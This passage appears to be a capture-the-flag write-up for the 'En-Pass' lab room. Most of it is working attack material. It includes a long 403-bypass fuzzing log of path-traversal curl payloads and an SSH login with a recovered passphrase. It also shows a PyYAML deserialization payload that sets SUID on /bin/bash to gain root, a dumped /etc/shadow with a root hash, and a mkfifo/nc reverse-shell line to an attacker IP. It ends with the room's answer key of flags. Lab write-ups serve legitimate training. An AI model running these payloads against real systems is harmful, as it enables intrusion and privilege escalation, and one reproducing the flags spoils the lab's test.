Payload [ /%252e%253b/ ]: Status: 403, Length : 1123 
Payload [ /%252e/ ]: Status: 403, Length : 1123 
Payload [ /%252f ]: Status: 403, Length : 1123 
Payload [ /%2e%2e ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/%2e%2e' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ /%2e%2e%3b/ ]: Status: 403, Length : 1123 
Payload [ /%2e%2e/ ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/%2e%2e/' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ /%2e%2f/ ]: Status: 404, Length : 277 
Payload [ /%2e%3b/ ]: Status: 403, Length : 1123 
Payload [ /%2e%3b// ]: Status: 403, Length : 1123 
Payload [ /%2e/ ]: Status: 403, Length : 1123 
Payload [ /%2e// ]: Status: 403, Length : 1123 
Payload [ /%2f ]: Status: 404, Length : 277 
Payload [ /%3b/ ]: Status: 403, Length : 1123 
Payload [ /.. ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/..' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ /..%2f ]: Status: 404, Length : 277 
Payload [ /..%2f..%2f ]: Status: 404, Length : 277 
Payload [ /..%2f..%2f..%2f ]: Status: 404, Length : 277 
Payload [ /../ ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/../' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ /../../ ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/../../' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ /../../../ ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/../../../' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ /../../..// ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/../../..//' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ /../..// ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/../..//' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ /../..//../ ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/../..//../' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ /../..;/ ]: Status: 404, Length : 277 
Payload [ /.././../ ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/.././../' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ /../.;/../ ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/../.;/../' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ /..// ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/..//' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ /..//../ ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/..//../' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ /..//../../ ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/..//../../' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ /..//..;/ ]: Status: 404, Length : 277 
Payload [ /../;/ ]: Status: 404, Length : 277 
Payload [ /../;/../ ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/../;/../' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ /..;%2f ]: Status: 404, Length : 277 
Payload [ /..;%2f..;%2f ]: Status: 404, Length : 277 
Payload [ /..;%2f..;%2f..;%2f ]: Status: 404, Length : 277 
Payload [ /..;/../ ]: Status: 403, Length : 1123 
Payload [ /..;/..;/ ]: Status: 403, Length : 1123 
Payload [ /..;// ]: Status: 403, Length : 1123 
Payload [ /..;//../ ]: Status: 200, Length : 917  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/..;//../' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ /..;//..;/ ]: Status: 403, Length : 1123 
Payload [ /..;/;/ ]: Status: 403, Length : 1123 
Payload [ /..;/;/..;/ ]: Status: 403, Length : 1123 
Payload [ /.// ]: Status: 403, Length : 1123 
Payload [ /.;/ ]: Status: 403, Length : 1123 
Payload [ /.;// ]: Status: 403, Length : 1123 
Payload [ //.. ]: Status: 403, Length : 1123 
Payload [ //../../ ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php//../../' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ //..; ]: Status: 403, Length : 1123 
Payload [ //./ ]: Status: 403, Length : 1123 
Payload [ //.;/ ]: Status: 403, Length : 1123 
Payload [ ///.. ]: Status: 403, Length : 1123 
Payload [ ///../ ]: Status: 403, Length : 1123 
Payload [ ///..// ]: Status: 403, Length : 1123 
Payload [ ///..; ]: Status: 403, Length : 1123 
Payload [ ///..;/ ]: Status: 403, Length : 1123 
Payload [ ///..;// ]: Status: 403, Length : 1123 
Payload [ //;/ ]: Status: 403, Length : 1123 
Payload [ /;/ ]: Status: 403, Length : 1123 
Payload [ /;// ]: Status: 403, Length : 1123 
Payload [ /;x ]: Status: 403, Length : 1123 
Payload [ /;x/ ]: Status: 403, Length : 1123 
Payload [ /x/../ ]: Status: 403, Length : 1123 
Payload [ /x/..// ]: Status: 403, Length : 1123 
Payload [ /x/../;/ ]: Status: 403, Length : 1123 
Payload [ /x/..;/ ]: Status: 403, Length : 1123 
Payload [ /x/..;// ]: Status: 403, Length : 1123 
Payload [ /x/..;/;/ ]: Status: 403, Length : 1123 
Payload [ /x//../ ]: Status: 403, Length : 1123 
Payload [ /x//..;/ ]: Status: 403, Length : 1123 
Payload [ /x/;/../ ]: Status: 403, Length : 1123 
Payload [ /x/;/..;/ ]: Status: 403, Length : 1123 
Payload [ ; ]: Status: 404, Length : 277 
Payload [ ;%09 ]: Status: 404, Length : 277 
Payload [ ;%09.. ]: Status: 404, Length : 277 
Payload [ ;%09..; ]: Status: 404, Length : 277 
Payload [ ;%09; ]: Status: 404, Length : 277 
Payload [ ;%2F.. ]: Status: 404, Length : 277 
Payload [ ;%2f%2e%2e ]: Status: 404, Length : 277 
Payload [ ;%2f%2e%2e%2f%2e%2e%2f%2f ]: Status: 404, Length : 277 
Payload [ ;%2f%2f/../ ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;%2f%2f/../' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ ;%2f.. ]: Status: 404, Length : 277 
Payload [ ;%2f..%2f%2e%2e%2f%2f ]: Status: 404, Length : 277 
Payload [ ;%2f..%2f..%2f%2f ]: Status: 404, Length : 277 
Payload [ ;%2f..%2f/ ]: Status: 404, Length : 277 
Payload [ ;%2f..%2f/..%2f ]: Status: 404, Length : 277 
Payload [ ;%2f..%2f/../ ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;%2f..%2f/../' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ ;%2f../%2f..%2f ]: Status: 404, Length : 277 
Payload [ ;%2f../%2f../ ]: Status: 404, Length : 277 
Payload [ ;%2f..//..%2f ]: Status: 404, Length : 277 
Payload [ ;%2f..//../ ]: Status: 404, Length : 277 
Payload [ ;%2f../// ]: Status: 404, Length : 277 
Payload [ ;%2f..///; ]: Status: 404, Length : 277 
Payload [ ;%2f..//;/ ]: Status: 404, Length : 277 
Payload [ ;%2f..//;/; ]: Status: 404, Length : 277 
Payload [ ;%2f../;// ]: Status: 404, Length : 277 
Payload [ ;%2f../;/;/ ]: Status: 404, Length : 277 
Payload [ ;%2f../;/;/; ]: Status: 404, Length : 277 
Payload [ ;%2f..;/// ]: Status: 404, Length : 277 
Payload [ ;%2f..;//;/ ]: Status: 404, Length : 277 
Payload [ ;%2f..;/;// ]: Status: 404, Length : 277 
Payload [ ;%2f/%2f../ ]: Status: 404, Length : 277 
Payload [ ;%2f//..%2f ]: Status: 404, Length : 277 
Payload [ ;%2f//../ ]: Status: 404, Length : 277 
Payload [ ;%2f//..;/ ]: Status: 404, Length : 277 
Payload [ ;%2f/;/../ ]: Status: 404, Length : 277 
Payload [ ;%2f/;/..;/ ]: Status: 404, Length : 277 
Payload [ ;%2f;//../ ]: Status: 404, Length : 277 
Payload [ ;%2f;/;/..;/ ]: Status: 404, Length : 277 
Payload [ ;/%2e%2e ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/%2e%2e' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ ;/%2e%2e%2f%2f ]: Status: 404, Length : 277 
Payload [ ;/%2e%2e%2f/ ]: Status: 404, Length : 277 
Payload [ ;/%2e%2e/ ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/%2e%2e/' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ ;/%2e. ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/%2e.' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ ;/%2f%2f../ ]: Status: 404, Length : 277 
Payload [ ;/%2f/..%2f ]: Status: 404, Length : 277 
Payload [ ;/%2f/../ ]: Status: 404, Length : 277 
Payload [ ;/.%2e ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/.%2e' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ ;/.%2e/%2e%2e/%2f ]: Status: 404, Length : 277 
Payload [ ;/.. ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/..' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ ;/..%2f ]: Status: 404, Length : 277 
Payload [ ;/..%2f%2f../ ]: Status: 404, Length : 277 
Payload [ ;/..%2f..%2f ]: Status: 404, Length : 277 
Payload [ ;/..%2f/ ]: Status: 404, Length : 277 
Payload [ ;/..%2f// ]: Status: 404, Length : 277 
Payload [ ;/../ ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/../' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ ;/../%2f/ ]: Status: 404, Length : 277 
Payload [ ;/../../ ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/../../' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ ;/../..// ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/../..//' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ ;/.././../ ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/.././../' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ ;/../.;/../ ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/../.;/../' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ ;/..// ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/..//' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ ;/..//%2e%2e/ ]: Status: 400, Length : 307 
Payload [ ;/..//%2f ]: Status: 404, Length : 277 
Payload [ ;/..//../ ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/..//../' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ ;/../// ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/..///' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ ;/../;/ ]: Status: 404, Length : 277 
Payload [ ;/../;/../ ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/../;/../' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ ;/..; ]: Status: 404, Length : 277 
Payload [ ;/.;. ]: Status: 404, Length : 277 
Payload [ ;//%2f../ ]: Status: 404, Length : 277 
Payload [ ;//.. ]: Status: 404, Length : 277 
Payload [ ;//../../ ]: Status: 200, Length : 2563  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;//../../' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯
Payload [ ;///.. ]: Status: 404, Length : 277 
Payload [ ;///../ ]: Status: 404, Length : 277 
Payload [ ;///..// ]: Status: 404, Length : 277 
Payload [ ;x ]: Status: 404, Length : 277 
Payload [ ;x/ ]: Status: 404, Length : 277 
Payload [ ;x; ]: Status: 404, Length : 277 
Payload [ & ]:  Status: 404, Length : 277 
Payload [ % ]: Status: 400, Length : 307 
Payload [ %09 ]: Status: 404, Length : 277 
Payload [ ../ ]: Status: 404, Length : 277 
Payload [ ../%2f ]: Status: 404, Length : 277 
Payload [ .././ ]: Status: 404, Length : 277 
Payload [ ..%00/ ]: Status: 404, Length : 277 
Payload [ ..%0d/ ] Status: 404, Length : 277 
Payload [ ..%5c ]: Status: 404, Length : 277 
Payload [ ..\ ]: Status: 404, Length : 277 
Payload [ ..%ff/ ]: Status: 404, Length : 277 
Payload [ %2e%2e%2f ]: Status: 404, Length : 277 
Payload [ .%2e/ ]: Status: 404, Length : 277 
Payload [ %3f ]: Status: 404, Length : 277 
Payload [ %26 ]: Status: 404, Length : 277 
Payload [ %23 ]: Status: 404, Length : 277 
Payload [ %2e ]: Status: 404, Length : 277 
Payload [ /. ]: Status: 403, Length : 1123 
Payload [ ? ]: Status: 403, Length : 1123 
Payload [ ?? ]: Status: 403, Length : 1123 
Payload [ ??? ]: Status: 403, Length : 1123 
Payload [ // ]: Status: 403, Length : 1123 
Payload [ /./ ]: Status: 403, Length : 1123 
Payload [ .//./ ]: Status: 404, Length : 277 
Payload [ //?anything ]: Status: 403, Length : 1123 
Payload [ # ]: Status: 403, Length : 1123 
Payload [ / ]: Status: 403, Length : 1123 
Payload [ /.randomstring ]: Status: 403, Length : 1123 
Payload [ ..;/ ]: Status: 404, Length : 277 
Payload [ .html ]: Status: 404, Length : 277 
Payload [ %20/ ]: Status: 404, Length : 277 
Payload: [ %20403.php%20/ ]: Status: 403, Length : 1123 
Payload [ .json ]: Status: 404, Length : 277 
Payload [ \..\.\ ]:^C

but always look length 

Payload [ /..;//../ ]: Status: 200, Length : 917  👌
╭────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/..;//../' -H 'User-Agent: Mozilla/5.0'
╰────────────────────────────────────────────────────────────────────╯

┌──(witty㉿kali)-[~/bug_hunter/4-ZERO-3]
└─$ curl -k -s 'http://10.10.219.232:8001/403.php/..;//../' -H 'User-Agent: Mozilla/5.0'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>En-Pass</title>

<style>
    body{

        background-color: #351d34;
        margin: 0px;
        padding: 0;
    }

.items{

    display: flex;
    justify-content: center;
    text-align: center;
    vertical-align: top;
    flex-direction: column;

}

h1{

    font-family: Verdana, Geneva, Tahoma, sans-serif;
    color:wheat;

}
.txt{

    margin-top: -80px;
    font-size: 150px;
    font-family: sans-serif;
    color: rgb(240, 190, 190);


}


.txt2{
    margin-top: -200px;
    font-family: sans-serif;
    color: rgb(240, 190, 190);



}

h3{

    color:rgb(240, 190, 100);
    font-size: 300px;

}




</style>


</head>
<body>           


<h3>Glad to see you here.Congo, you bypassed it. 'imsau' is waiting for you somewhere.</h3>
</body>
</html> 

so username: imsau
pass: cimihan_are_you_here?

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh -i enpass_rsa imsau@10.10.219.232
Enter passphrase for key 'enpass_rsa': 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-201-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

1 package can be updated.
1 of these updates is a security update.
To see these additional updates run: apt list --upgradable


$ id
uid=1002(imsau) gid=1002(imsau) groups=1002(imsau)
$ ls
user.txt
$ cat user.txt	
1c5ccb6ce6f3561e302e0e516c633da9

$ /bin/bash
imsau@enpass:/opt$ ls
scripts
imsau@enpass:/opt$ cd scripts/
imsau@enpass:/opt/scripts$ ls
file.py
imsau@enpass:/opt/scripts$ cat file.py 
#!/usr/bin/python
import yaml


class Execute():
	def __init__(self,file_name ="/tmp/file.yml"):
		self.file_name = file_name
		self.read_file = open(file_name ,"r")

	def run(self):
		return self.read_file.read()

data  = yaml.load(Execute().run())

imsau@enpass:/opt/scripts$ ls -lah
total 12K
drwxr-xr-x 2 root root 4.0K Jan 31  2021 .
drwxr-xr-x 3 root root 4.0K Jan 31  2021 ..
-r-xr-xr-x 1 root root  250 Jan 31  2021 file.py

https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation

python -c 'import yaml; yaml.load("!!python/object/new:os.system [echo EXPLOIT!]")'

imsau@enpass:/opt/scripts$ cd /tmp
imsau@enpass:/tmp$ ls
imsau@enpass:/tmp$ vim file.yml

imsau@enpass:/tmp$ cat file.yml
!!python/object/new:os.system [chmod u+s /bin/bash]

This code will set SUID on /bin/bash when the cronjob is run

imsau@enpass:/tmp$ ls -lah /bin/bash
-rwsr-xr-x 1 root root 1014K Jul 12  2019 /bin/bash
imsau@enpass:/tmp$ bash -p
bash-4.3# cd /root
bash-4.3# ls
root.txt

bash-4.3# cat root.txt
5d45f08ee939521d59247233d3f8faf

bash-4.3# cat /etc/shadow
root:$6$3ajDX6WW$tmjQSV8Zeh0B10ycUf5oNJYXHgE9hTc5zyFqyaaHs8ctD9uvXn8xUF1n6J35gjZ7RuYICoLlCEa7TrdBvsFrt1:18658:0:99999:7:::
daemon:*:18655:0:99999:7:::
bin:*:18655:0:99999:7:::
sys:*:18655:0:99999:7:::
sync:*:18655:0:99999:7:::
games:*:18655:0:99999:7:::
man:*:18655:0:99999:7:::
lp:*:18655:0:99999:7:::
mail:*:18655:0:99999:7:::
news:*:18655:0:99999:7:::
uucp:*:18655:0:99999:7:::
proxy:*:18655:0:99999:7:::
www-data:*:18655:0:99999:7:::
backup:*:18655:0:99999:7:::
list:*:18655:0:99999:7:::
irc:*:18655:0:99999:7:::
gnats:*:18655:0:99999:7:::
nobody:*:18655:0:99999:7:::
systemd-timesync:*:18655:0:99999:7:::
systemd-network:*:18655:0:99999:7:::
systemd-resolve:*:18655:0:99999:7:::
systemd-bus-proxy:*:18655:0:99999:7:::
syslog:*:18655:0:99999:7:::
_apt:*:18655:0:99999:7:::
lxd:*:18655:0:99999:7:::
messagebus:*:18655:0:99999:7:::
uuidd:*:18655:0:99999:7:::
dnsmasq:*:18655:0:99999:7:::
sshd:*:18655:0:99999:7:::
pollinate:*:18655:0:99999:7:::
imsau:!:18658:0:99999:7:::

or can be

!!python/object/new:os.system [rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.19.103 4444 >/tmp/f ]

```

Answer the questions below

  
Name The Path.

*/web/resources/infoseek/configure/key*

What is the user flag?  

The path you get will forbid to see but you can bypass it.

*1c5ccb6ce6f3561e302e0e516c633da9*

What is the root flag?

*5d45f08ee939521d59247233d3f8faf*

[[pyLon]]